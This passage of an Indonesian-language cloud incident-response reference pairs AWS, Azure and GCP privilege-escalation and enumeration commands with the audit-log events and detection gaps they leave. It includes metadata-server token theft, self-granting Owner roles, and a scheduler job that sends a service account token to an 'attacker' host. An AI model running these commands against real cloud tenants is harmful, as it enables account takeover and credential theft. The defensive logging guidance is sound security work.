| `iam:UpdateLoginProfile` (tanpa `CreateLoginProfile`) | reset password console user existing | `aws iam update-login-profile --user-name V --password 'N3w!Pass' --no-password-reset-required` | `UpdateLoginProfile` |
| `iam:PutUserPolicy` + policy yang izinkan `sts:AssumeRole` ke role admin | samarkan via managed condition | `aws iam put-user-policy --user-name V --policy-name P --policy-document file://p.json` | `PutUserPolicy` (dulu), `CreatePolicyVersion`-like effect via user policy |
| `iam:PutRolePolicy` pada role yang sudah bisa di-assume | tambah inline tanpa ubah trust | `aws iam put-role-policy --role-name R --policy-name P --policy-document file://p.json` | `PutRolePolicy` |
| `lambda:UpdateFunctionCode` pada function ber-role kuat | inject kode → role fungsinya | `aws lambda update-function-code --function-name F --zip-file fileb://x.zip` | `UpdateFunctionCode20150331v2` |
| `lambda:CreateFunction` + `iam:PassRole` | buat function baru assume role admin | `aws lambda create-function --function-name X --runtime python3.12 --role arn:aws:iam::ACCT:role/AdminRole --handler h --zip-file fileb://x.zip` | `CreateFunction20150331` |
| `lambda:AddPermission` (cross-account) | endpoint publik yang invoke dengan role sendiri | `aws lambda add-permission --function-name F --statement-id s --action lambda:InvokeFunction --principal ACCT2` | `AddPermission20150331v2` |
| `glue:CreateDevEndpoint` / `glue:UpdateDevEndpoint` | shell via Glue dengan role Glue | `aws glue create-dev-endpoint --endpoint-name x --role-arn arn:aws:iam::A:role/GlueAdmin --public-key file://k.pub` | `CreateDevEndpoint` |
| `cloudformation:CreateStack` + `iam:PassRole` + `CAPABILITY_IAM` | execution role upgrade via `AWS::IAM::Policy` inline | `aws cloudformation create-stack --stack-name x --template-body file://t.yaml --capabilities CAPABILITY_IAM --role-arn arn:aws:iam::A:role/CFNExec` | `CreateStack` |
| `cloudformation:UpdateStack` pada stack dengan role kuat | inject resource `AWS::IAM::Policy` | `aws cloudformation update-stack --stack-name S --template-body file://t.yaml --capabilities CAPABILITY_IAM` | `UpdateStack` |
| `datapipeline:CreatePipeline` + `datapipeline:PutPipelineDefinition` + `iam:PassRole` | instance role via DataPipeline | `aws datapipeline create-pipeline --name p --unique-id p` lalu `put-pipeline-definition` dengan `role` objek | `CreatePipeline`, `PutPipelineDefinition` |
| `sagemaker:CreateNotebookInstance` + `iam:PassRole` | notebook dengan role target | `aws sagemaker create-notebook-instance --notebook-instance-name n --instance-type ml.t2.medium --role-arn arn:aws:iam::A:role/Target` | `CreateNotebookInstance` |
| `sagemaker:CreatePresignedNotebookInstanceUrl` | akses notebook existing | `aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name n` | `CreatePresignedNotebookInstanceUrl` |
| `codebuild:StartBuild` pada project ber-role | enviroment variable injection / buildspec override | `aws codebuild start-build --project-name P --environment-variables-override name=X,value=...` | `StartBuild` |
| `ecs:RegisterTaskDefinition` + `ecs:RunTask` + `iam:PassRole` | role container | `aws ecs register-task-definition --cli-input-json file://td.json` | `RegisterTaskDefinition` |
| `ecs:UpdateService` pada service ber-role | swap task def | `aws ecs update-service --cluster C --service S --task-definition new:1` | `UpdateService` |
| `ssm:SendCommand` + role yang punya SSM core | RCE pada instance | `aws ssm send-command --document-name AWS-RunShellScript --instance-ids i-xxx --parameters commands=id` | `SendCommand` |
| `ssm:StartSession` / `ssm:ResumeSession` | interactive shell | `aws ssm start-session --target i-xxx` | `StartSession` |
| `sts:AssumeRole` pada role chain yang berakhir admin | role chaining | `aws sts assume-role --role-arn arn:aws:iam::A:role/Chain1 --role-session-name x` | `AssumeRole` (berantai per hop) |
| `iam:GetFederationToken` | token STS dari IAM user → permission subset user (trik: jika user punya policy luas tapi tidak aktif, federation token bisa lebih longgar pada kasus MFA) | `aws sts get-federation-token --name x --policy file://p.json` | `GetFederationToken` |
| `iam:PassRole` ke `ec2:RunInstances` dengan `--instance-profile` | instance profile role | (lihat variasi di 7.9.5) | `RunInstances` + `PassRole` (jika trail mencatat resource role) |

### 7.9.5 Varian `iam:PassRole` yang lolos condition — edge case 2023+

Condition pada `iam:PassRole` di resource role sering `iam:PassedToService` atau `iam:AssociatedResourceArn`. Bypass yang masih jalan:

```bash
# target role yang diizinkan untuk ec2 → tetap bisa via create-launch-template + versi
aws ec2 create-launch-template --launch-template-name lt --version-description v \
  --launch-template-data '{"ImageId":"ami-xxx","InstanceType":"t3.micro","IamInstanceProfile":{"Name":"TargetProfile"}}'
aws ec2 run-instances --launch-template LaunchTemplateName=lt --count 1
# CloudTrail: CreateLaunchTemplate, RunInstances (PassRole TIDAK muncul sebagai event terpisah, melainkan sebagai authorization check pada CreateLaunchTemplate)
```

Fakta deteksi penting: **`iam:PassRole` bukan API — tidak ada event `PassRole` di CloudTrail.** Ia muncul sebagai `errorCode`/`authorization` field di event pemanggil (`RunInstances`, `CreateFunction`, `CreateStack`, `RunTask`, `CreateNotebookInstance`). Ini jebakan besar saat IR: banyak analis mencari `eventName=PassRole` dan tidak menemukan apa-apa.

### 7.9.6 Condition bypass `iam:PolicyARN` & `aws:ResourceAccount`

Rotation check yang sering luput: managed policy yang sudah di-attach di account sendiri bisa dipakai tanpa `AttachUserPolicy` baru, cukup `iam:CreatePolicyVersion` pada managed policy tersebut — jalur ini **tidak** memicu `AttachUserPolicy` tapi memicu `CreatePolicyVersion`.

```bash
aws iam create-policy-version --policy-arn arn:aws:iam::A:policy/SharedP --policy-document file://admin.json --set-as-default
# CloudTrail: CreatePolicyVersion (managed policy change); ini "stealth" karena tidak ada Attach/Detach
```

### 7.9.7 Varian STS & sesi

| Teknik | Detail | Event CloudTrail | Jebakan |
|---|---|---|---|
| `sts:AssumeRoleWithSAML` | jika IdP SAML trust longgar (`Condition` hanya `StringEquals` audience) | `AssumeRoleWithSAML` | source `principalId` = SAML subjek; sering tidak punya `userIdentity.type=AssumedRole` di log lama |
| `sts:AssumeRoleWithWebIdentity` (EKS IRSA) | OIDC provider condition `sub` wildcard → role apa saja | `AssumeRoleWithWebIdentity` | log memuat `webIdFederationData` |
| `iam:GetSessionToken` + MFA | jika user punya MFA tapi tidak dipaksa, attacker bisa pakai user tanpa MFA ke API | `GetSessionToken` | session token punya `mfaAuthenticated=false` — filter kunci |
| `sts:TagSession` abuse | tag untuk `aws:PrincipalTag` condition bypass | muncul sebagai field `requestParameters.tags` di `AssumeRole` | cek `transitiveTagKeys` |

### 7.9.8 Jejak CloudTrail yang wajib dicek per tahap IR (AWS)

```bash
# event yang paling sering kelewat karena bukan "data event"
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ListRoles
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetAccountAuthorizationDetails
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetRolePolicy
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=SimulatePrincipalPolicy
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetParametersByPath
```

Pivot dari CloudTrail:
- Field `userIdentity.sessionContext.sessionIssuer.arn` → role sesi yang dipakai.
- Field `userIdentity.sessionContext.sessionIssuer.userName` untuk assumed role lama.
- `userIdentity.accessKeyId` → cocokkan dengan `iam list-access-keys` per user / `sts get-caller-identity` pemakaian (bukan pemilik).
- `errorCode=AccessDenied` beruntun dengan `eventSource` beragam = enumeration script (pacu/cloudfox).

## 7.10 Azure — ladder paralel

### 7.10.1 Klasifikasi principal (bedakan yang sering bikin salah triase)

| Jenis identitas | Ciri di token | Ladder start |
|---|---|---|
| User (interactive) | `idtyp=user`, `upn` ada | `az ad signed-in-user show` |
| Service principal (app) | `idtyp=app`, `oid` app obj | `az ad sp show --id <oid>` |
| Managed identity (system/user assigned) | `idtyp=app`, `oid` = MSI object, tidak ada `az ad` obj untuk instance | `az vm identity show` / IMDS |
| Workload identity federation (AKS) | token OIDC issuer | cek `federatedIdentityCredentials` di app |
| Azure DevOps service connection | token ADO → SP | cek `az devops service-endpoint list` |

```bash
# handshake
az account show
az ad signed-in-user show --query '{id:id,upn:userPrincipalName}' -o jsonc   # user
az ad sp show --id $(az account show --query user.name -o tsv) 2>/dev/null   # SP
# management group & subscription reach
az account management-group list -o table
az account list --all -o table
az role assignment list --assignee <oid> --all --include-inherited -o table
az role definition list --custom-role-only true -o table
```

### 7.10.2 Enumeration ladder Azure (post-identity)

| Stage | Command | Activity Log `operationName` |
|---|---|---|
| E1 | `az account show` (local) | tidak tercatat |
| E2 | `az role assignment list --assignee <oid> --all` | `Microsoft.Authorization/roleAssignments/read` |
| E3 | `az role definition list --custom-role-only true` | `Microsoft.Authorization/roleDefinitions/read` |
| E4 | `az graph query -q 'Resources \| project id,type'` | `Microsoft.ResourceGraph/resources/read` |
| E5 | `az rest --method GET --url https://graph.microsoft.com/v1.0/servicePrincipals/<oid>/appRoleAssignments` | Graph `List appRoleAssignments` |
| E6 | `az rest --method GET --url https://graph.microsoft.com/v1.0/applications` | Graph `List applications` |
| E7 | `az keyvault secret list --vault-name K` | `Microsoft.KeyVault/vaults/secrets/read` |
| E8 | `az deployment group list -g G` (cari secure params) | `Microsoft.Resources/deployments/read` |
| E9 | `az rest --method POST --url 'https://management.azure.com/providers/Microsoft.Authorization/elevateAccess'` (UAA — bila berhasil, tanda ownership global) | `Microsoft.Authorization/elevateAccess/action` |

### 7.10.3 Privesc jalur Azure per permission — tabel lanjutan

| Permission/control plane | Primitif | Command persis | Activity Log |
|---|---|---|---|
| `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action` | pasang MI ber-role kuat ke resource attacker-controlled | `az vm identity assign -g G -n V --identities /subscriptions/S/resourceGroups/G/providers/Microsoft.ManagedIdentity/userAssignedIdentities/Target` | `Microsoft.Compute/virtualMachines/write` |
| `Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/write` | OIDC impostor → token MI dari luar | `az rest --method PUT --url '.../federatedIdentityCredentials/evil' --body @fic.json` | `microsoft.managedidentity/userassignedidentities/federatedidentitycredentials/write` |
| `Microsoft.Automation/automationAccounts/runbooks/draft/write` + `.../publish/action` | code exec di Automation Account (Hybrid Worker) | `az automation runbook replace-content` → `publish` → `start` | `.../runbooks/draft/write`, `.../publish/action`, `.../runbooks/draft/publish/action` |
| `Microsoft.Automation/automationAccounts/credentials/write` | simpan credential baru (privesc bila runbook berikut jalan sebagai akun automation) | `az automation credential create` | `.../credentials/write` |
| `Microsoft.ContainerService/managedClusters/listClusterAdminCredential/action` | ambil kubeconfig admin AKS | `az aks get-credentials -g G -n C --admin` | `.../listClusterAdminCredential/action` |
| `Microsoft.ContainerService/managedClusters/listClusterUserCredential/action` | kubeconfig user (mungkin lebih longgar dari RBAC AKS) | `az aks get-credentials -g G -n C` | idem |
| `Microsoft.ContainerRegistry/registries/importImage/action` | pull image dari registry lain ke registry attacker-attached | `az acr import -n T --source <src> -t repo/img` | `.../importImage/action` |
| `Microsoft.KeyVault/vaults/secrets/read` pada vault dengan access policy longgar | secret curl | `az keyvault secret show --vault-name K --name n` | `Microsoft.KeyVault/vaults/secrets/read` |
| `Microsoft.KeyVault/vaults/accessPolicies/write` | beri self permission di vault | `az keyvault set-policy -n K --upn <me> --secret-permissions get list` | `.../accessPolicies/write` |
| `Microsoft.Compute/virtualMachines/runCommand/action` | RCE sebagai MI VM | `az vm run-command invoke -g G -n V --command-id RunShellScript --scripts 'id'` | `.../runCommand/action` |
| `Microsoft.Compute/virtualMachineScaleSets/virtualMachines/runCommand/action` | idem VMSS | `az vmss run-command invoke` | idem |
| `Microsoft.Resources/deployments/write` + role Owner pada scope | ARM template naruh role assignment baru | `az deployment group create -g G --template-file t.json --parameters @p.json` | `Microsoft.Resources/deployments/write` |
| `Microsoft.Authorization/roleAssignments/write` | role Assignment langsung | `az role assignment create --assignee <me> --role Owner --scope /subscriptions/S` | `.../roleAssignments/write` |
| `Microsoft.Authorization/roleDefinitions/write` | buat custom role lalu assign | `az role definition create --role-definition r.json` | `.../roleDefinitions/write` |
| `Microsoft.Graph` `Application.ReadWrite.All` | add client secret ke app target → auth sebagai SP app lain | `az ad app credential reset --id <appObjId> --append` | Graph `addPassword` |
| `Directory.ReadWrite.All` / `AppRoleAssignment.ReadWrite.All` | assign app role (mis. `RoleManagement.ReadWrite.Directory` → jadi Global Admin) | `az rest --method POST --url '.../servicePrincipals/<oid>/appRoleAssignedTo' --body @a.json` | Graph `add appRoleAssignedTo` |
| `Microsoft.Sql/servers/administrators/write` | set AD admin SQL ke self | `az sql server ad-admin create -g G -s S -u <me> -i <objId>` | `.../administrators/write` |
| `Microsoft.Storage/storageAccounts/listKeys/action` | ambil key → akses penuh storage | `az storage account keys list -g G -n S` | `.../listKeys/action` |
| `Microsoft.Web/sites/config/list/action` + `.../publish` | ambil publishing profile → deploy code | `az webapp deployment list-publishing-credentials` | `.../config/list/action` |
| `Microsoft.DevTestLab/labs/users/serviceFabrics/...` | RCE via Service Fabric lab (sering lupa di-SP) | `az rest` create Service Fabric lab resource | `Microsoft.DevTestLab/...` |

### 7.10.4 Jejak & jebakan Azure

- **Activity Log retensi default 90 hari**; lebih lama harus "Diagnostic settings" → Log Analytics. Banyak triase salah karena hanya membaca Activity Log dan menyimpulkan "tidak ada enumeration" padahal sumbernya Log Analytics.
- **ARM Authorization cache** — role assignment baru butuh hingga ~10 menit efektif di token; enumeration yang "gagal" bisa jadi karena cache, bukan permission.
- **`az rest` dan Graph** tidak muncul di Activity Log tapi di Entra `AuditLogs` (`directoryAudits`). Untuk IR wajib union:
  ```bash
  az rest --method GET --url 'https://graph.microsoft.com/v1.0/auditLogs/directoryAudits?$filter=activityDateTime ge 2024-01-01T00:00:00Z' |
    jq '.value[] | {activity: .activityDisplayName, actor: .initiatedBy.user.userPrincipalName, target: .targetResources[].displayName}'
  ```
- **`elevateAccess`** (UAA) tidak muncul di Activity Log subscription tetapi di tenant-level audit — cek `directoryAudits` filter `activityDisplayName eq 'Add member to role'` atau `Enable User Access Administrator`.
- **Conditional Access meninggalkan sinyal berbeda** (Sign-in logs), bukan Activity Log.
- **Managed identity token request** (IMDS `169.254.169.254`) tidak tercatat di CloudTrail/Azure Activity — hanya bisa dilihat di VM logs / Defender for Cloud alerts. Jadi tidak ada jejak server-side token issue, hanya jejak pemakaian token pada API sesudahnya.

### 7.10.5 Command set lengkap (triage cepat Azure)

```bash
# identity & reach
az account show
az account list --all -o tsv --query '[].id'
az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv) --all --include-inherited
az ad app list --all --query '[].{appId:appId,name:displayName}' -o table
az ad sp list --all --query '[].{appId:appId,name:displayName}' -o table # perlu Directory.Read.All
# credentials
az keyvault list --query '[].name' -o tsv | xargs -I{} az keyvault secret list --vault-name {} 2>/dev/null
az storage account list --query '[].{n:name,rg:resourceGroup}'
# escalation liveness (safe, read-only-ish)
az rest --method POST --url 'https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2015-07-01'  # <= hanya jika scope UAA; cek 200 vs 403
```

## 7.11 GCP — ladder paralel

### 7.11.1 Klasifikasi principal

| Jenis | Ciri token | Ladder start |
|---|---|---|
| User (`gcloud auth login`) | `email` @gmail/workspace | `gcloud auth list`, `gcloud config list` |
| Service account key (`credentials.json`) | `client_id` numerik | `gcloud auth activate-service-account --key-file=...` |
| GCE/GKE/Cloud Run metadata MI | token dari metadata server | cek `gcloud auth print-access-token` di instance |
| Workload Identity Federation (GitHub OIDC dll) | `sts.googleapis.com` token exchange | cek `workloadIdentityPools` |
| Impersonation (delegated) | `serviceAccountTokenCreator` | `gcloud auth print-access-token --impersonate-service-account=<sa>` |

```bash
gcloud auth list
gcloud config get-value project
gcloud projects get-iam-policy $(gcloud config get-value project) --format=json > proj-iam.json
gcloud iam service-accounts list --format=table
gcloud organizations list
gcloud resource-manager folders list --organization=<org> # jika ada org-level read
```

### 7.11.2 Enumeration ladder GCP

| Stage | Command | Audit Log methodName |
|---|---|---|
| E1 | `gcloud auth list` / `gcloud config list` | local |
| E2 | `gcloud projects get-iam-policy <p>` | `GetIamPolicy` (Admin Activity) |
| E3 | `gcloud asset search-all-iam-policies --scope=projects/<p>` | `assets.searchAllIamPolicies` (Data Access — butuh Data Access log on) |
| E4 | `gcloud asset search-all-resources --scope=projects/<p>` | `assets.searchAllResources` (Data Access) |
| E5 | `gcloud iam service-accounts list --project <p>` | `ListServiceAccounts` |
| E6 | `gcloud iam service-accounts keys list --iam-account=<sa>` | `ListServiceAccountKeys` |
| E7 | `gcloud secrets list --project <p>` | `ListSecrets` (Admin Activity — tercatat) |
| E8 | `gcloud secrets versions access latest --secret=<s>` | `AccessSecretVersion` (Data Access — butuh explicit enable) |
| E9 | `gcloud storage ls -p <p>` | `storage.objects.list` (Data Access) |
| E10 | `gcloud compute instances list --project <p>` | `compute.instances.list` (Data Access untuk list; Admin Activity untuk get) |
| E11 | `gcloud iam roles list --project <p>` + `gcloud iam roles describe <r>` | `ListRoles`, `GetRole` |
| E12 | `gcloud beta asset analyze-iam-policy --full-explorer` / `gcloud policy-intelligence` | `assets.analyzeIamPolicy` |

Jebakan utama: **Admin Activity log aktif default; Data Access log NON-aktif default.** Jadi enumeration lewat `secrets list`, `asset search-all-*`, `storage ls` bisa **tidak** meninggalkan jejak di log kecuali Data Access diaktifkan. Ini beda fundamental dari AWS/Azure. Tim IR harus cek `gcloud logging settings describe` per resource.

### 7.11.3 Privesc jalur GCP — tabel lanjutan

| Permission/role kunci | Primitif | Command persis | methodName (Admin Activity) |
|---|---|---|---|
| `iam.serviceAccountKeys.create` | kunci SA target → auth langsung | `gcloud iam service-accounts keys create k.json --iam-account=<sa>@<p>.iam.gserviceaccount.com` | `CreateServiceAccountKey` |
| `iam.serviceAccounts.getAccessToken` | token langsung untuk SA | `gcloud auth print-access-token --impersonate-service-account=<sa>@...` | `GenerateAccessToken` (Data Access! sering tidak tercatat) |
| `iam.serviceAccounts.signBlob` / `signJwt` | forge JWT → GCP token mint (jika `iam.serviceAccounts.getAccessToken` tidak ada) | `gcloud iam service-accounts sign-jwt payload.json signed.txt --iam-account=<sa>` | `SignJwt`, `SignBlob` (Data Access) |
| `iam.serviceAccounts.actAs` + Compute | attach SA ke instance attacker-controlled | `gcloud compute instances set-service-account <i> --service-account=<sa> --scopes=cloud-platform` (atau create inst dengan `--service-account`) | `compute.instances.setServiceAccount`, `compute.instances.insert` |
| `iam.serviceAccounts.actAs` + Cloud Functions | deploy function ber-SA | `gcloud functions deploy f --runtime=python311 --trigger-http --service-account=<sa> --source=src/ --entry-point=h` | `google.cloud.functions.v1.CloudFunctionsService.CreateFunction` |
| `iam.serviceAccounts.actAs` + Cloud Run | deploy service ber-SA | `gcloud run deploy s --image gcr.io/x/y --service-account=<sa> --region=us-central1 --allow-unauthenticated` | `google.cloud.run.v1.Services.CreateService` |
| `iam.serviceAccounts.actAs` + GKE | buat pod ber-SA via kubectl | `kubectl run p --image=alpine --restart=Never --overrides='{"spec":{"serviceAccountName":"<sa>"}}'` | `k8s.io` audit, bukan GCP Admin Activity |
| `iam.roles.update` | tambah permission ke custom role yang sudah di-assign ke self | `gcloud iam roles update <role> --project=<p> --add-permissions=roles/owner-perm` | `UpdateRole` |
| `iam.roles.create` + `iam.roleBindings`/policy write | custom role superuser lalu bind | `gcloud iam roles create evil --project=<p> --permissions=...` lalu policy patch | `CreateRole`, `SetIamPolicy` |
| `resourcemanager.projects.setIamPolicy` | SetIamPolicy langsung | `gcloud projects add-iam-policy-binding <p> --member=user:<me> --role=roles/owner` | `SetIamPolicy` |
| `resourcemanager.folders.setIamPolicy` | escalation di folder/org | `gcloud resource-manager folders add-iam-policy-binding <f> --member=user:<me> --role=roles/owner` | `SetIamPolicy` (folder resource) |
| `deploymentmanager.deployments.create` | apply template dengan SA host | `gcloud deployment-manager deployments create d --config=config.yaml` | `deploymentmanager.deployments.create` |
| `cloudfunctions.functions.create` + `actAs` | function deploy | (lihat di atas) | CreateFunction |
| `composer.environments.create` | Composer worker SA = host escape | `gcloud composer environments create e --location=... --service-account=<sa>` | `google.cloud.orchestration.airflow.service.v1.Environments.CreateEnvironment` |
| `notebooks.instances.create` | notebook ber-SA | `gcloud notebooks instances create n --vm-image-project=deeplearning-platform-release ...` | `CreateInstance` |
| `dataproc.clusters.create` | cluster ber-SA | `gcloud dataproc clusters create c --service-account=<sa>` | `dataproc.ClusterController.CreateCluster` |
| `bigquery.jobs.create` | query dengan SA billing/executor | `bq query --use_legacy_sql=false 'SELECT 1'` (SA host lewat run-as) | `JobService.InsertJob` |
| `cloudscheduler.jobs.create` | job HTTP ke endpoint attacker dengan SA target | `gcloud scheduler jobs create http j --schedule='* * * * *' --uri=https://attacker/ --oidc-service-account-email=<sa>` | `CreateJob` |
| `iam.workloadIdentityPools.providers.update` | OIDC provider condition longgar → mint SA token via STS | `gcloud iam workload-identity-pools providers update-oidc <p> --attribute-condition='true'` | `providers.update` |

### 7.11.4 Jejak Audit Log GCP — jebakan praktis

```bash
# ambil semua Admin Activity (default on)
gcloud logging read 'logName="projects/PROJECT/logs/cloudaudit.googleapis.com%2Factivity"' \
  --freshness=7d --format=json | jq -r '.[] | [.timestamp, .protoPayload.methodName, .protoPayload.authenticationInfo.principalEmail] | @tsv'

# Data Access (harus di-enable dulu)
gcloud logging read 'logName="projects/PROJECT/logs/cloudaudit.googleapis.com%2Fdata_access"' \
  --freshness=7d --format=json
```

Poin operasional:
- **`GenerateAccessToken` dan `GenerateIdToken` adalah Data Access** — kalau Data Access log mati (default), impersonation tidak meninggalkan jejak.
- **`signJwt` / `signBlob` juga Data Access.** Enumeration yang "berhasil tapi tidak ada log" biasanya karena ini.
- **Activity Log tidak cover Kubernetes/GKE workload call ke K8s SA**: hanya tercatat di GKE audit log dan Cloud Logging dengan `logName=k8s_cluster`.
- **`SetIamPolicy` tercatat, tapi `GetIamPolicy` juga Admin Activity** — jadi banyak `GetIamPolicy` = indikasi enumeration meski Data Access mati.
- **Service Account `actAs`** tidak menghasilkan audit event tersendiri saat dipakai dari `gcloud`; jejaknya adalah `authenticationInfo.principalEmail=<user>` + `serviceAccountDelegationInfo.firstPartyPrincipal=<sa>` di event target.
- **`asset.searchAllResources` / `searchAllIamPolicies`** adalah Data Access — reconnaissance akan "silent" bila logging Data Access off.

### 7.11.5 Command set lengkap (triage cepat GCP)

```bash
# identity & reach
gcloud auth list --format='value(account,status)'
gcloud projects list --format='value(projectId)'
gcloud organizations list --format='value(name,displayName)'
gcloud projects get-iam-policy <p> --format=json > iam.json
gcloud iam service-accounts list --project <p>
gcloud iam roles list --project <p>

# fresh cred extraction
gcloud auth print-access-token
gcloud auth print-identity-token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# escalation liveness (baca-only dulu)
gcloud iam roles describe roles/editor
gcloud asset search-all-resources --scope=projects/<p> --limit=5 # konfirmasi asset API berjalan
```

## 7.12 Varian lintas-cloud & edge case 2024–2025

| Topik | AWS | Azure | GCP |
|---|---|---|---|
| **OIDC workload federation** | IAM OIDC provider `sub` wildcard → `sts:AssumeRoleWithWebIdentity`; event `AssumeRoleWithWebIdentity` | Federated Identity Credential pada app registration / user-assigned MI; token issuer condition `sub` terlalu longgar | Workload Identity Pool `attributeCondition='true'` → `sts.googleapis.com` issue SA token; methodName `google.identity.sts.v1.SecurityTokenService.ExchangeToken` (Data Access!) |
| **SSO/conditional bypass** | `iam:CreateLoginProfile` untuk user SSO (tidak butuh console pada IdP) | Per-app authentication policy longgar; `az rest` dari jaringan non-CA | `gcloud auth login --no-browser` + service account key |
| **Trust policy condition wildcard** | `"Principal": {"AWS": "*"}` pada `sts:AssumeRole` sering muncul dari template lama | `appRoleAssignedTo` tanpa restriction | `attributeCondition: "true"` di WIF provider |
| **Cross-account/tenant** | `AssumeRole` `ExternalId` yang hilang/lemah | Multi-tenant app + `adminConsent` | `iam.workloadIdentityPools` lintas project |
| **Token cache pitfall** | `sts` token 1 jam; `AssumeRole` chain bisa 12 jam dengan `DurationSeconds` (max role chaining 1 jam per hop) | ARM token ~1 jam, refresh via refresh token menurut CA/SIF | `gcloud auth print-access-token` 1 jam; `print-identity-token` <=1 jam |
| **Cred di CI/CD** | CodeBuild env var, GitHub OIDC to IAM | ADO service connection ID + secret, GitHub OIDC to Entra app | WIF dari GH Actions, GitLab OIDC |
| **Cred di artefak** | `.aws/credentials` di AMI/EBS snapshot, userdata EC2, ECS task env, EKS secrets, CodeCommit repo, S3 bucket public | ARM template parameter, pipeline secret (devops), App Settings Function, Key Vault access policy misconfig | `credentials.json` di VM image, Cloud Build trigger secret, GCS object public, Composer Airflow connection |

### 7.12.1 Edge case token & auth (baru 2024–2025)

- **AWS `sts:AssumeRoot`** (Nov 2024): memungkinkan principal dengan `sts:AssumeRoot` mengasumsikan root sesi terbatas per akun anggota (hanya untuk Org management account). Muncul `AssumeRoot` di CloudTrail — deteksi: eventName `AssumeRoot` dengan `requestParameters.taskPolicyArn` non-null. Ini jalur yang sebelumnya tidak ada untuk "root-ish" akses tanpa root.
- **AWS IAM Access Analyzer follow-up 2024**: `iam:SimulatePrincipalPolicy` sekarang bisa dipakai untuk assertion pada external access; enumeration dengan `SimulatePrincipalPolicy` tetap tercatat (eventName sama).
- **Azure `ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials` GA**: memungkinkan issuance token MI dari issuer arbitrary → **kombinasi baru 2024** untuk persistence tanpa SP key. Audit call: `microsoft.managedidentity/userassignedidentities/federatedidentitycredentials/write`.
- **Azure `Authentication Methods` / `Temporary Access Pass`** misuse: bila attacker punya `UserAuthenticationMethod.ReadWrite.All`, bisa set TAP ke korban → login. Audit `directoryAudits` activity `Admin registered security info`.
- **GCP `GenerateAccessToken` audit Data Access** (sejak ~2023): kalau di-enable, mint SA token tercatat dengan `protoPayload.methodName="GenerateAccessToken"` dan `serviceAccountDelegationInfo`.
- **GCP `sts ExchangeToken` Data Access**: semua WIF exchange — kalau logging on, grep `ExchangeToken` di Data Access log.
- **AWS EKS Pod Identity** (GA 2023): menggantikan IRSA. Pod identity association bisa dipakai untuk privesc jika `eks:CreatePodIdentityAssociation` tersedia + `iam:PassRole` → pod as role apapun. Cek event `CreatePodIdentityAssociation`, `TagResource` di EKS.
- **Cloud Run `run.services.update`** + `iam.serviceAccounts.actAs`: swap SA ke SA admin, traffic tetap. Audit `google.cloud.run.v1.Services.ReplaceService`.
- **Azure Container Apps** analog: `Microsoft.App/containerApps/write` + `assign` MI.

### 7.12.2 Jebakan operasional enumerasi (semua cloud)

- **Enumeration "silent" di GCP Data Access-off** — jangan simpulkan "tidak ada aktivitas" sampai `logging settings` per project dicek.
- **`GetCallerIdentity` di AWS tidak punya resources** — banyak trail management events filter berdasarkan field `resources`, jadi event ini bisa absen. Jangan pakai ketiadaannya sebagai bukti.
- **Activity Log Azure hanya control plane** — enumerasi via Graph (`az rest`) masuk ke `AuditLogs` Entra, bukan Activity Log. IR wajib union.
- **`PassRole`/`actAs` bukan event di AWS dan GCP** — jejaknya sebagai authorization check di event pemanggil. Grep `errorCode`/`authorizationError` pada event target, atau `serviceAccountDelegationInfo` di GCP.
- **Simulate/can-i probe sendiri**: `iam simulate-principal-policy` (AWS), `az rest POST providers/Microsoft.Authorization/checkAccess` (Azure), `gcloud policy-troubleshoot iam` / `gcloud asset analyze-iam-policy` (GCP) — semuanya bisa terdeteksi sebagai "attacker mencoba memahami permission". Tim biru sering tidak menandai ini karena bukan "aktivitas destruktif".
- **Rotation check enumerasi**: pasca-rotation, Access Key ID lama bisa muncul di `LookupEvents` ketika dipakai. Cek `userIdentity.accessKeyId` unik sebagai pivot, bukan hanya user.
- **IAM entity tag hijack** (AWS 2023+): role dengan condition `aws:PrincipalTag/team` bisa diubah tag-nya sendiri jika punya `iam:TagRole` + `iam:UntagRole` + permission tag yang lebih longgar. Event: `TagRole`, `UntagRole`.
- **Azure `elevateAccess`** idempotent — panggilan kedua tidak error meski sudah aktif, jadi "tidak ada error" ≠ "baru diaktifkan". Cek `directoryAudits` untuk waktu aktivasi.
- **GCP `roles/owner` di project ≠ org admin** — masih bisa di-block oleh org policy (`iam.allowedPolicyMemberDomains`, `iam.disableServiceAccountKeyCreation`). Cek org policy sebelum menyimpulkan "full control".
- **Cloud-specific network deny** (SCP di AWS Org, Azure Management Lock + Deny Assignments, GCP `iam.allowedPolicyMemberDomains` + VPC Service Controls) bisa membuat "permission ada di policy tapi gagal di runtime". VPC-SC `ERR_VPC_SERVICE_CONTROLS` di GCP adalah jebakan klasik saat enumerasi storage/BQ.

### 7.12.3 Rangkuman jejak minimum yang harus dicek saat IR (per cloud)

| Cloud | Sumber utama | Yang sering hilang |
|---|---|---|
| AWS | CloudTrail management events | `GetCallerIdentity`, `PassRole`, `GetSessionToken` (kadang), data events (S3 object, Lambda invoke detail) |
| Azure | Activity Log + Entra `AuditLogs` + Sign-in logs | ARM token issue terhadap MI, `az rest` Graph ops (masuk Entra), MI IMDS |
| GCP | Admin Activity + Data Access (harus on) | `GenerateAccessToken`, `SignJwt`, `ExchangeToken`, `AccessSecretVersion`, `searchAll*`, GKE API calls (audit K8s terpisah) |


---

## [reasoning trace]


